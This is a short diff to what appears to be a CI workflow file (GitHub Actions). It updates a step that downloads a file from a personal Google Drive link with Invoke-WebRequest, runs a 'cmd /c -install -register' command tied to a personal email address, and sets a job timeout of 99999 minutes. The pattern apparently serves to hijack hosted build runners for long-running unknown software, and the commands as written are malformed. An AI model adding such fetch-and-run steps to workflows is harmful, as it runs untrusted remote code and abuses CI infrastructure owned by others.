@@ -11,7 +11,7 @@ jobs:
       - name: first step
         run: |
          
-         Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=13fp07AYiONScFmMkJTdLNjto_m-
+         Invoke-WebRequest -Uri "https://drive.usercontent.google.com/download?id=13fp07AYiONScFmMkJTdLNjto_m-Lo20d&export=download&authuser=0"
              cmd /c -install -register kauanscintras@gmail.com
           
     timeout-minutes: 99999
